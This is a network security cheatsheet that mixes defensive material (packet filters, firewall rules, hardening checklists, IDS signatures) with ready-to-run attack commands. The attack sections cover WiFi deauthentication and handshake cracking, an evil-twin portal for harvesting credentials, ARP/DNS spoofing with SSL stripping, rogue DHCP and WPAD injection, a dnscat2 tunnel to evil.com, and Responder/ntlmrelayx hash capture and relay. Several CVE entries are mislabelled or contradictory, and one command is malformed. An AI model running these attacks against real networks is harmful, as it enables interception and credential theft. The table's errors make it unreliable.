# Network & Protocol Security — Quick Reference Cheatsheet

## tcpdump / Wireshark Display Filters

### tcpdump

```bash
# Capture all traffic on interface
tcpdump -i eth0 -w capture.pcap

# Filter by host
tcpdump -i eth0 host 10.0.0.1
tcpdump -i eth0 src net 10.0.0.0/24
tcpdump -i eth0 dst port 443

# Protocol filters
tcpdump -i eth0 icmp
tcpdump -i eth0 tcp
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'
tcpdump -i eth0 'tcp[tcpflags] & tcp-ack != 0 and tcp[tcpflags] & tcp-syn == 0'
tcpdump -i eth0 'udp dst port 53'

# DNS query capture
tcpdump -i eth0 -n 'udp dst port 53 and udp[10:2] & 0x8000 = 0'

# HTTP plaintext capture
tcpdump -i eth0 -A -s0 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0)>>2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0)>>2):4] = 0x504f5354)'

# TLS ClientHello SNI extraction
tcpdump -i eth0 -A -s0 'tcp dst port 443 and tcp[((tcp[12:1]&0xf0)>>2)+5:1]=0x01 and tcp[((tcp[12:1]&0xf0)>>2)+1:2]=0x0301 or tcp[((tcp[12:1]&0xf0)>>2)+1:2]=0x0302 or tcp[((tcp[12:1]&0xf0)>>2)+1:2]=0x0303' 2>/dev/null | grep -oE '[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# ARP traffic
tcpdump -i eth0 -n arp

# BGP traffic
tcpdump -i eth0 -n tcp port 179

# DHCP traffic
tcpdump -i eth0 -n 'udp port 67 or udp port 68'

# mDNS/LLMNR
tcpdump -i eth0 -n 'udp port 5353 or udp port 5355'

# Avoid DNS resolution (fast capture)
tcpdump -i eth0 -nn -c 1000 -w out.pcap
```

### Wireshark Display Filters

```
# TLS handshake only
tls.handshake.type == 1 || tls.handshake.type == 2 || tls.handshake.type == 4 || tls.handshake.type == 11 || tls.handshake.type == 12 || tls.handshake.type == 14

# TLS ClientHello with specific SNI
tls.handshake.type == 1 && tls.handshake.extensions_server_name contains "example.com"

# DNS queries only
dns.qry.name contains "example.com" && dns.flags.response == 0

# HTTP headers
http.request || http.response

# TCP SYN packets only (connection attempts)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# TCP RST packets
tcp.flags.reset == 1

# ARP spoofing detection (multiple ARP replies for same IP)
arp.duplicate-address-detected

# DHCP Offer/ACK
bootp.opcode == 2

# BGP UPDATE messages
bgp.update

# ICMP destination unreachable
icmp.type == 3

# Specific TCP conversation
ip.addr == 10.0.0.1 && tcp.port == 443

# Retransmission detection
tcp.analysis.retransmission

# TCP zero window
tcp.window_size_value == 0
```

---

## nmap Scan Commands and NSE Scripts

### Scan Types

| Command | Description |
|---------|-------------|
| `nmap -sS -p- -T4 target` | TCP SYN scan, all ports, aggressive timing |
| `nmap -sT -p 1-1024 target` | TCP connect scan, well-known ports |
| `nmap -sU -p 53,67,68,161,5353 target` | UDP scan, common UDP ports |
| `nmap -sS -sU -p T:1-65535,U:53,161 target` | Combined TCP+UDP scan |
| `nmap -sA -p 1-1024 target` | TCP ACK scan (firewall rule mapping) |
| `nmap -sW -p 1-1024 target` | TCP Window scan (OS detection, open/closed) |
| `nmap -sN -p 1-1024 target` | TCP Null scan (no flags, stealth) |
| `nmap -sF -p 1-1024 target` | TCP FIN scan |
| `nmap -sX -p 1-1024 target` | TCP Xmas scan (FIN+PSH+URG) |
| `nmap -sn 10.0.0.0/24` | Ping sweep (host discovery only) |
| `nmap -sn -PE -PP -PM target` | ICMP echo, timestamp, netmask discovery |
| `nmap -sV -p 80,443,8080 target` | Service version detection |
| `nmap -O --osscan-guess target` | OS detection |
| `nmap -A target` | Aggressive: OS + version + script + traceroute |
| `nmap -6 -sS target` | IPv6 SYN scan |

### Evasion and Timing

| Command | Description |
|---------|-------------|
| `nmap -f target` | Fragment packets |
| `nmap -D RND:10 target` | Decoys (random 10) |
| `nmap -S spoofed_ip -e eth0 target` | Spoof source IP |
| `nmap --source-port 53 target` | Source port manipulation (DNS) |
| `nmap --data-length 25 target` | Append random data to packets |
| `nmap --randomize-hosts target` | Randomize scan order |
| `nmap -T0 target` | Paranoid timing (IDS evasion) |
| `nmap -T1 target` | Sneaky timing |
| `nmap -T2 target` | Polite timing |
| `nmap -T3 target` | Normal timing (default) |
| `nmap -T4 target` | Aggressive timing |
| `nmap -T5 target` | Insane timing |
| `nmap --max-rate 100 target` | Cap at 100 packets/sec |
| `nmap --scan-delay 5s target` | 5s delay between probes |

### Key NSE Scripts

| Script | Category | Description |
|--------|----------|-------------|
| `--script ssl-enum-ciphers` | vuln | Enumerate TLS cipher suites |
| `--script ssl-heartbleed` | vuln | Check for Heartbleed (CVE-2014-0160) |
| `--script ssl-cert` | default | Extract TLS certificate info |
| `--script ssl-poodle` | vuln | Check for POODLE |
| `--script dns-zone-transfer` | discovery | Attempt AXFR |
| `--script dns-brute` | discovery | Brute-force subdomains |
| `--script dns-cache-snoop` | discovery | DNS cache snooping |
| `--script http-enum` | discovery | Enumerate web directories |
| `--script http-headers` | discovery | HTTP security headers check |
| `--script http-sql-injection` | vuln | SQL injection testing |
| `--script http-xss` | vuln | XSS detection |
| `--script smb-vuln-ms17-010` | vuln | EternalBlue detection |
| `--script smb-enum-shares` | discovery | SMB share enumeration |
| `--script ssh-auth-methods` | discovery | SSH auth methods |
| `--script ssh-hostkey` | discovery | SSH host key fingerprint |
| `--script broadcast-dhcp-discover` | discovery | DHCP server discovery |
| `--script broadcast-arp-discovery` | discovery | ARP discovery on local network |
| `--script firewalk` | discovery | Firewall rule discovery via IP TTL |
| `--script krb5-enum-users` | auth | Kerberos user enumeration |

```bash
# Full vulnerability scan
nmap -sV --script vuln target

# TLS audit
nmap -p 443 --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-cert target

# DNS enumeration
nmap -p 53 --script dns-zone-transfer,dns-brute,dns-cache-snoop target --script-args dns-brute.domain=example.com

# Script categories
nmap --script="auth,discovery,vuln" target
nmap --script="not(brute)" target
```

---

## iptables / nftables Cheat Sheet

### iptables

```bash
# === CHAINS AND TABLES ===
iptables -L -n -v                     # List all rules (numeric, verbose)
iptables -t nat -L -n -v              # List NAT rules
iptables -t mangle -L -n -v           # List mangle rules

# === BASIC FILTERING ===
# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established connections
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH with rate limiting
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set --name ssh
iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 --rttl --name ssh -j DROP
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT

# Allow specific services
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Drop invalid packets
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# Log dropped packets (before DROP rule)
iptables -A INPUT -j LOG --log-prefix "IPTables-Dropped: " --log-level 4
iptables -A INPUT -j DROP

# === NAT ===
# Masquerade (SNAT for dynamic IP)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# DNAT (port forward)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.2:8080

# === ADVANCED ===
# Block IP range
iptables -A INPUT -s 10.0.0.0/24 -j DROP

# SYN flood protection
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Block uncommon MSS (possible evasion)
iptables -A INPUT -p tcp -m tcpmss ! --mss 536:65535 -j DROP

# Block XMAS packets
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# Block NULL packets
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
```

### nftables

```bash
# === TABLE AND CHAIN SETUP ===
nft list ruleset                                    # List all rules
nft add table inet filter                          # Add inet (IPv4+IPv6) table
nft add chain inet filter input '{ type filter hook input priority 0 ; policy drop ; }'
nft add chain inet filter forward '{ type filter hook forward priority 0 ; policy drop ; }'
nft add chain inet filter output '{ type filter hook output priority 0 ; policy accept ; }'

# === BASIC RULES ===
# Allow established
nft add rule inet filter input ct state established,related accept

# Allow loopback
nft add rule inet filter input iif lo accept

# Allow SSH with rate limiting
nft add set inet filter ssh_rate '{ type ipv4_addr ; flags dynamic ; timeout 60s ; }'
nft add rule inet filter input tcp dport 22 ct state new add @ssh_rate '{ ip saddr limit rate 3/minute }' accept
nft add rule inet filter input tcp dport 22 ct state new drop

# Allow HTTPS
nft add rule inet filter input tcp dport '{ 80, 443 }' accept

# Drop invalid
nft add rule inet filter input ct state invalid drop

# === SETS AND MAPS (O(1) lookup) ===
nft add set inet filter blocked_ips '{ type ipv4_addr ; }'
nft add rule inet filter input ip saddr @blocked_ips drop

nft add set inet filter allowed_ports '{ type inet_service ; }'
nft add rule inet filter input tcp dport @allowed_ports accept

# Multi-element set
nft add element inet filter allowed_ports '{ 22, 80, 443 }'

# === NAT ===
nft add table inet nat
nft add chain inet nat postrouting '{ type nat hook postrouting priority 100 ; }'
nft add chain inet nat prerouting '{ type nat hook prerouting priority -100 ; }'

nft add rule inet nat postrouting oif eth0 masquerade
nft add rule inet nat prerouting tcp dport 80 dnat to 10.0.0.2:8080

# === LOGGING ===
nft add rule inet filter input log prefix "NFT-DROP: " drop

# === ATOMIC RULE REPLACEMENT ===
nft -f ruleset.nft                  # Load entire ruleset atomically
```

---

## TLS Testing Commands

### openssl s_client

```bash
# Connect to HTTPS server
openssl s_client -connect example.com:443

# Show certificate chain
openssl s_client -connect example.com:443 -showcerts

# Test specific protocol version
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -tls1_1
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3

# Test specific cipher
openssl s_client -connect example.com:443 -cipher AES256-SHA
openssl s_client -connect example.com:443 -cipher ECDHE-RSA-AES256-GCM-SHA384

# Test with SNI
openssl s_client -connect example.com:443 -servername example.com

# Extract certificate
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout

# Check certificate dates
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates

# Check OCSP
openssl ocsp -issuer chain.pem -cert cert.pem -url http://ocsp.example.com -text

# Test STARTTLS
openssl s_client -connect mail.example.com:587 -starttls smtp

# Export session keys (for Wireshark decryption)
openssl s_client -connect example.com:443 -keylogfile /tmp/sslkeys.log -sess_out /tmp/session.pem

# Test DH parameters
openssl s_client -connect example.com:443 -dhparam /dev/stdin <<< "$(openssl dhparam 2048)"
```

### testssl.sh

```bash
# Full scan
testssl.sh example.com

# Scan specific port
testssl.sh example.com:8443

# Protocol versions only
testssl.sh -P example.com

# Cipher suites only
testssl.sh -E example.com

# Vulnerability scan only
testssl.sh -V example.com

# Check for specific vulnerabilities
testssl.sh -H example.com            # Heartbleed
testssl.sh -B example.com            # ROBOT
testssl.sh -J example.com            # LOGJAM
testssl.sh -F example.com            # FREAK
testssl.sh -O example.com            # POODLE
testssl.sh -R example.com            # Sweet32

# Check for downgrade prevention
testssl.sh -f example.com

# Certificate info
testssl.sh -S example.com

# Output formats
testssl.sh --json example.com
testssl.sh --csv example.com

# Mass scanning
testssl.sh --mode parallel --prepend https -iL targets.txt
```

### sslyze

```bash
# Full scan
sslyze --regular example.com

# Protocol version scan
sslyze --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3 example.com

# Cipher suite enumeration
sslyze --sslv3 --tlsv1 --tlsv1_1 --tlsv1_2 example.com

# Heartbleed check
sslyze --heartbleed example.com

# ROBOT check
sslyze --robot example.com

# Certificate info
sslyze --certinfo example.com

# HTTP headers
sslyze --http_headers example.com

# Elliptic curve info
sslyze --elliptic_curves example.com
```

---

## WiFi Attack Command Reference

### aircrack-ng Suite

```bash
# === MONITOR MODE ===
airmon-ng check kill                      # Kill interfering processes
airmon-ng start wlan0                     # Start monitor mode
airmon-ng stop wlan0mon                   # Stop monitor mode

# === RECONNAISSANCE ===
airodump-ng wlan0mon                      # Scan all channels
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon   # Targeted capture

# === DEAUTHENTICATION ===
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon  # Deauth client
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon                        # Continuous deauth

# === WPA2 HANDSHAKE CAPTURE ===
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# Wait for "WPA handshake" in top-right

# === FORGED AUTH (fake association) ===
aireplay-ng -1 0 -e "TargetAP" -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# === ARP REQUEST REPLAY (WEP) ===
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# === WEP CRACKING ===
aircrack-ng -a 1 -b AA:BB:CC:DD:EE:FF capture-01.cap

# === WPA/WPA2 CRACKING ===
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# === PMKID ATTACK (no deauth needed) ===
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3
hcxtools -o pmkid.hash pmkid.pcapng
hashcat -m 16800 pmkid.hash /usr/share/wordlists/rockyou.txt

# === WPA3 DRAGONBLOOD ===
# Downgrade to WPA2 and capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3 wlan0mon
# Use dragon-force tool for SAE password derivation

# === EVIL TWIN ===
# Create rogue AP
hostapd-wpe -B -c hostapd-wpe.conf
# Captive portal for credential harvesting
dnsmasq -C dnsmasq.conf
python3 -m http.server 80

# === KRACK ATTACK ===
# Use krackattacks-scripts to replay EAPOL frames
# Requires modified hostapd
```

### hostapd-wpe Configuration

```ini
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=CorporatePassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP

# WPE-specific options
wpe_logfile=/tmp/hostapd-wpe.log
wpe_honeypot=0
```

### Bettercap

```bash
# Start bettercap
bettercap -iface eth0

# Reconnaissance
net.probe on
net.sniff on

# ARP spoofing
set arp.spoof.targets 10.0.0.1,10.0.0.5
arp.spoof on

# DNS spoofing
set dns.spoof.domains example.com,*.example.com
set dns.spoof.address 10.0.0.5
dns.spoof on

# HTTPS spoofing (SSL stripping)
set arp.spoof.targets 10.0.0.5
arp.spoof on
set http.proxy.sslstrip true
http.proxy on

# Captive portal
set http.proxy.injectjs "document.location='http://10.0.0.5/captive'"
http.proxy on
```

---

## DNS Enumeration Tools and Commands

```bash
# === BASIC LOOKUPS ===
dig example.com A                     # A record
dig example.com AAAA                  # AAAA record
dig example.com MX                    # MX record
dig example.com NS                    # NS record
dig example.com TXT                   # TXT record
dig example.com SOA                   # SOA record
dig -x 10.0.0.1                      # Reverse lookup
dig example.com ANY                   # All records (deprecated in practice)

# === DNSSEC VALIDATION ===
dig example.com +dnssec               # DNSSEC records
dig example.com DNSKEY                # DNSKEY record
dig example.com DS                    # DS record (at parent zone)
dnspython: python3 -c "import dns.resolver; print(dns.resolver.resolve('example.com','DNSKEY'))"

# === ZONE TRANSFER ===
dig @ns1.example.com example.com AXFR                    # Attempt AXFR
host -l example.com ns1.example.com                      # Zone transfer via host
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com ns1.example.com

# === SUBDOMAIN ENUMERATION ===
# dnsrecon
dnsrecon -d example.com -t std         # Standard enumeration
dnsrecon -d example.com -t brt         # Brute force
dnsrecon -d example.com -t snoop       # DNS cache snooping
dnsrecon -d example.com -t axfr        # Zone transfer

# fierce
fierce --domain example.com

# subfinder
subfinder -d example.com -all -t 50

# amass
amass enum -active -d example.com

# === DNS TUNNELING DETECTION ===
# Look for unusually long subdomains or high TXT record volume
tcpdump -i eth0 -n 'udp port 53' -w dns.pcap
# Then analyze: tshark -r dns.pcap -Y "dns.qry.name.len > 30"

# === DNS REBINDING TEST ===
# First resolution: short TTL, attacker IP
dig @ns-attacker.example.com rebind.example.com
# Subsequent resolution: internal IP
dig @ns-attacker.example.com rebind.example.com

# === DNS OVER HTTPS ===
curl -s -H 'Accept: application/dns-json' "https://dns.google/resolve?name=example.com&type=A"
curl -s -H 'Accept: application/dns-json' "https://cloudflare-dns.com/dns-query?name=example.com&type=A"

# === DNS CACHE POISONING TEST ===
# Use dnschef for local DNS spoofing
dnschef --fakeip 10.0.0.5 --interface 0.0.0.0 --port 53

# === DNS RECONNAISSANCE WITH RESOLVE ===
python3 -c "
import dns.resolver
for rtype in ['A','AAAA','MX','NS','TXT','SOA','SRV','CAA']:
    try:
        answers = dns.resolver.resolve('example.com', rtype)
        for rdata in answers:
            print(f'{rtype}: {rdata}')
    except Exception as e:
        print(f'{rtype}: {e}')
"
```

---

## Network Device Hardening Checklist

### Switch Hardening

- [ ] Enable Port Security (sticky MAC, max 2 per port)
- [ ] Disable unused ports (`shutdown`)
- [ ] Enable Dynamic ARP Inspection (DAI)
- [ ] Enable DHCP Snooping (`ip dhcp snooping`, `ip dhcp snooping vlan X`)
- [ ] Enable IP Source Guard
- [ ] Configure storm control
- [ ] Enable 802.1X port-based authentication
- [ ] Disable CDP/LLDP on untrusted ports
- [ ] Disable HTTP/HTTPS management interface (use SSH only)
- [ ] Configure SNMPv3 only (disable SNMPv1/v2c)
- [ ] Enable logging to centralized syslog server
- [ ] Configure NTP authentication
- [ ] Enable BPDU Guard on edge ports
- [ ] Enable Root Guard on non-designated ports
- [ ] Disable dynamic trunking (DTP)
- [ ] Set native VLAN to unused VLAN
- [ ] Configure local authentication with TACACS+ fallback

### Router Hardening

- [ ] Enable uRPF strict mode on customer-facing interfaces
- [ ] Filter bogon/martian addresses (ingress and egress)
- [ ] Implement BGP route filtering (prefix-lists, AS-path filters)
- [ ] Enable RPKI route origin validation
- [ ] Enable BGP MD5 authentication
- [ ] Disable IP directed broadcasts
- [ ] Enable CoPP (Control Plane Policing)
- [ ] Disable unnecessary services (echo, discard, daytime, chargen, finger)
- [ ] Disable CDP on external interfaces
- [ ] Disable IP source routing
- [ ] Configure ingress/egress ACLs
- [ ] Enable NetFlow/sFlow for traffic analysis
- [ ] Configure NTP with authentication
- [ ] Disable HTTP server, enable SSH v2
- [ ] Configure logging with timestamp and sequence numbers

### Firewall Hardening

- [ ] Default deny inbound (whitelist only)
- [ ] Egress filtering (block outbound except authorized)
- [ ] Disable unnecessary services (SNMP, telnet, HTTP admin)
- [ ] Enable logging for denied traffic
- [ ] Review and remove shadow/redundant rules
- [ ] Implement geoblocking (no legitimate traffic regions)
- [ ] Enable IPS/IDS on all interfaces
- [ ] Configure session timeouts (TCP 3600s, UDP 30s)
- [ ] Enable SYN flood protection
- [ ] Block fragmented packets from external interfaces
- [ ] Implement anti-spoofing on all interfaces
- [ ] Enable TCP sequence randomization
- [ ] Configure DNS doctoring for NAT
- [ ] Regular rule review and justification audit

---

## IDS/IPS Rule Writing (Snort/Suricata)

### Snort Rule Syntax

```
[action] [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port] ([options])
```

### Rule Components

| Component | Values | Description |
|-----------|--------|-------------|
| **Action** | `alert`, `log`, `pass`, `drop`, `reject`, `sdrop` | What to do when rule matches |
| **Protocol** | `tcp`, `udp`, `icmp`, `ip` | Layer 4 protocol |
| **Direction** | `->` | Source to destination |
| **IP/Port** | `any`, `!80`, `$HOME_NET`, `$EXTERNAL_NET` | IP/port matching |

### Key Rule Options

| Option | Description | Example |
|--------|-------------|---------|
| `msg` | Alert message | `msg:"ET EXPLOIT Log4Shell";` |
| `content` | Payload content match | `content:"${jndi:";` |
| `nocase` | Case-insensitive match | `content:"password"; nocase;` |
| `depth` | Match within N bytes | `depth:200;` |
| `offset` | Start match at byte N | `offset:10;` |
| `within` | Match within N bytes of previous | `within:50;` |
| `distance` | Minimum bytes from previous | `distance:5;` |
| `pcre` | Perl-compatible regex | `pcre:"/root\@/i";` |
| `flow` | Direction/state | `flow:established,to_server;` |
| `dsize` | Payload size | `dsize:>500;` |
| `flags` | TCP flags | `flags:S,12;` |
| `ttl` | TTL value | `ttl:<10;` |
| `id` | IP ID field | `id:1234;` |
| `classtype` | Rule category | `classtype:trojan-activity;` |
| `sid` | Signature ID | `sid:2021001;` |
| `rev` | Rule revision | `rev:3;` |
| `reference` | External reference | `reference:cve,2021-44228;` |
| `metadata` | Additional info | `metadata:attack_target Client_Endpoint;` |

### Suricata-Specific Features

| Feature | Syntax | Description |
|---------|--------|-------------|
| `flowbits` | `flowbits:set,tag_name;` | State tracking across packets |
| `xbits` | `xbits:set,tag_name,track ip,expire 60;` | Cross-flow tracking |
| `ja3_hash` | `ja3.hash == "e7d705a3286e19ea42f587b344ee6865";` | TLS fingerprint match |
| `ja3_string` | `ja3.string; content:"769,47-53-5-10-49171-49172-";` | TLS client param match |
| `ja4` | `ja4.hash == "t13d1516h2_8daaf6152771_e3b0c44298fc";` | JA4 fingerprint |
| `tls.sni` | `tls.sni; content:".onion";` | SNI-based detection |
| `filestore` | `filestore;` | Extract files from sessions |
| `app-layer-protocol` | `app-layer-protocol:http;` | Protocol identification |
| `dns.query` | `dns.query; content:"evil.com";` | DNS query match |
| `http.uri` | `http.uri; content:"/admin";` | HTTP URI match |
| `http.header` | `http.header; content:"User-Agent\|3a\| ";` | HTTP header match |
| `http.stat_code` | `http.stat_code; content:"200";` | HTTP status code |
| `http.request_body` | `http.request_body; content:"cmd=";` | HTTP POST body |

### Example Rules

```bash
# Detect Log4Shell exploitation attempt
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"EXPLOIT Log4Shell JNDI Lookup"; flow:established,to_server; http.header; content:"${jndi:"; nocase; classtype:trojan-activity; sid:2021001; rev:3;)

# Detect DNS tunneling (long subdomain queries)
alert dns $HOME_NET any -> any 53 (msg:"DNS Exfil - Long Subdomain"; dns.query; content:".";
pcre:"/([a-zA-Z0-9]{30,}\.){2,}/"; classtype:trojan-activity; sid:2021002; rev:1;)

# Detect suspicious TLS SNI
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Suspicious TLS SNI - .bit TLD"; tls.sni; content:".bit"; classtype:trojan-activity; sid:2021003; rev:1;)

# Detect SSH brute force
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force - Many Connections"; flow:to_server; flags:S; threshold:type both, track by_src, count 5, seconds 60; classtype:attempted-dos; sid:2021004; rev:2;)

# Detect ICMP tunneling
alert icmp $HOME_NET any -> $EXTERNAL_NET any (msg:"ICMP Tunnel - Large Payload"; dsize:>200; classtype:trojan-activity; sid:2021005; rev:1;)

# Detect ARP spoofing (same MAC for different IPs)
alert arp any any -> any any (msg:"ARP Spoofing Detected"; arp.operation:2; classtype:attempted-recon; sid:2021006; rev:1;)

# Detect SMB scanning (EternalBlue)
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"SMB Scanning - EternalBlue"; flow:established,to_server; content:"|00 00 00|"; depth:4; content:"|FF|SMB"; depth:8; offset:4; classtype:attempted-admin; sid:2021007; rev:2;)
```

---

## Key CVE Quick-Reference Table for Network Vulnerabilities

| CVE | Protocol/Service | Vulnerability Type | CVSS | Impact | Key Detail |
|-----|-------------------|-------------------|------|--------|------------|
| CVE-2014-0160 | OpenSSL TLS | Buffer over-read (Heartbleed) | 7.5 | Info leak | 64KB per heartbeat, no auth needed |
| CVE-2014-3566 | SSL 3.0 | CBC padding oracle (POODLE) | 5.0 | Plaintext recovery | Requires MITM + SSLv3 fallback |
| CVE-2015-0204 | OpenSSL RSA | Export cipher downgrade (FREAK) | 5.0 | Session key recovery | 512-bit RSA factorization |
| CVE-2015-4000 | TLS DH | Export DH downgrade (LOGJAM) | 7.5 | Session key recovery | 512-bit DH parameter cracking |
| CVE-2015-3456 | QEMU VENOM | Floppy buffer overflow | 10.0 | Host RCE from guest | VM escape via emulated floppy |
| CVE-2016-0800 | SSLv2 | Cross-protocol attack (DROWN) | 7.5 | Session key recovery | Attack SSLv2 to decrypt TLS |
| CVE-2016-2183 | TLS 3DES | Sweet32 birthday attack | 5.0 | Plaintext recovery | 64-bit block cipher in long sessions |
| CVE-2017-3735 | WPA2 | KRACK 4-way handshake | 6.5 | Key reuse, decryption | Replay EAPOL message 3 |
| CVE-2017-6862 | TLS RSA | Bleichenbacher oracle (ROBOT) | 7.5 | RSA PKCS#1 decryption | Same class as original 1998 attack |
| CVE-2018-6789 | Exim SMTP | Buffer overflow | 9.8 | Remote code execution | Off-by-one in base64 decoder |
| CVE-2018-10936 | PostgreSQL | Auth bypass via channel binding | 8.8 | Authentication bypass | libpq channel binding negotiation |
| CVE-2019-11510 | Pulse Secure VPN | Arbitrary file read | 10.0 | RCE, credential theft | Path traversal in web interface |
| CVE-2019-14899 | VPN | Data decryption via MTU | 7.4 | Plaintext recovery | MTU probing leaks plaintext |
| CVE-2019-16276 | Go HTTP/2 | HPACK bomb | 7.5 | DoS | Header table size amplification |
| CVE-2020-0601 | Windows CryptoAPI | ECC curve validation bypass | 8.8 | Spoofing, MITM | Custom curve with same generator |
| CVE-2020-13777 | GnuTLS | Session randomness failure | 5.3 | Info leak | TLS 1.3 key zeroization bug |
| CVE-2020-1967 | OpenSSL |Segmentation fault | 5.9 | DoS | Uninitialized cipher in SSL_check_chain |
| CVE-2021-22893 | Pulse Secure VPN | Auth bypass | 10.0 | RCE as root | Improper session handling |
| CVE-2021-44228 | Apache Log4j | RCE via JNDI | 10.0 | Remote code execution | Log message injection → JNDI lookup |
| CVE-2022-0778 | OpenSSL | Infinite loop in certificate verification | 7.5 | DoS | Crafted X.509 certificate |
| CVE-2022-27191 | Go SSH | Algorithm negotiation crash | 7.5 | DoS | Malformed SSH message |
| CVE-2023-27997 | FortiOS | Heap overflow in SSL VPN | 9.2 | RCE | Stack-based buffer overflow |
| CVE-2023-44487 | HTTP/2 | Rapid Reset (DDoS) | 7.5 | DDoS | Cancel stream immediately after request |
| CVE-2024-21762 | FortiOS | Out-of-bounds write | 9.6 | Unauthenticated RCE | Heap overflow in SSL VPN daemon |

---

## ARP / DHCP / DNS Attack Payloads

### ARP Spoofing

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing with arpspoof
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1       # Target: 10.0.0.5, Gateway: 10.0.0.1
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5       # Reverse: gateway → target

# ARP spoofing with bettercap
bettercap -iface eth0
set arp.spoof.targets 10.0.0.5
arp.spoof on

# ARP spoofing detection
arpwatch -i eth0                              # Watch for ARP changes
arpping -I eth0 10.0.0.1                     # Verify MAC of gateway
arp -a | sort                                 # Check for duplicate MACs

# Dynamic ARP Inspection (defense)
# Cisco:
ip dhcp snooping
ip dhcp snooping vlan 1-4094
ip arp inspection vlan 1-4094
ip arp inspection filter arp-acl vlan 1-4094
```

### DHCP Attacks

```bash
# DHCP starvation (exhaust address pool)
yersinia dhcp -attack 1                      # DHCP starvation attack

# Rogue DHCP server
dnsmasq --interface=eth0 --dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,1h \
         --dhcp-option=3,10.0.0.5            # Set gateway to attacker
         --dhcp-option=6,10.0.0.5             # Set DNS to attacker

# DHCP option injection (WPAD proxy)
dnsmasq --interface=eth0 --dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,1h \
         --dhcp-option=252,"http://10.0.0.5/wpad.dat"

# DHCP snooping defense (Cisco)
ip dhcp snooping
ip dhcp snooping vlan 1-4094
ip dhcp snooping trust                      # Trust uplink ports only
no ip dhcp snooping information option       # If DHCP relay not needed
```

### DNS Spoofing

```bash
# Local DNS spoofing with dnsspoof
dnsspoof -i eth0 -f hosts.txt                # hosts.txt: 10.0.0.5 example.com

# Local DNS spoofing with bettercap
bettercap -iface eth0
set dns.spoof.domains example.com,*.example.com
set dns.spoof.address 10.0.0.5
dns.spoof on

# DNS cache poisoning (Kaminsky-style, requires MITM position)
# Use tool: https://github.com/qzaidi/dnsamp
# Requires: ability to observe/modify DNS traffic on path

# DNS rebinding (attacker-controlled NS)
# Configure NS for evil.com to return:
# Query 1: evil.com → A 10.0.0.5 (attacker IP, TTL=1s)
# Query 2: evil.com → A 192.168.1.100 (internal IP, TTL=1s)
# Browser same-origin policy treats both as evil.com

# DNS tunneling (dnscat2)
dnscat2 --dns domain=evil.com --dns-server=10.0.0.5
# On server:
ruby dnscat2.rb evil.com

# DNS exfiltration detection
# Look for: long subdomain labels, high volume of TXT queries,
# unusual query frequency, consistent timing patterns
tshark -r dns.pcap -Y "dns.qry.name.len > 40"
```

### LLMNR/NBT-NS Poisoning

```bash
# Poison LLMNR and NBT-NS with Responder
Responder -I eth0 -wrf

# Capture NetNTLMv2 hashes
# Hashes stored in /usr/share/responder/logs/

# Relay captured hashes with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Defense: Disable LLMNR and NBT-NS
# Group Policy: Computer Config > Admin Templates > Network > DNS Client >
#   Turn off Multicast Resolution = Enabled
# Registry:
reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticastResolver /t REG_DWORD /d 0 /f
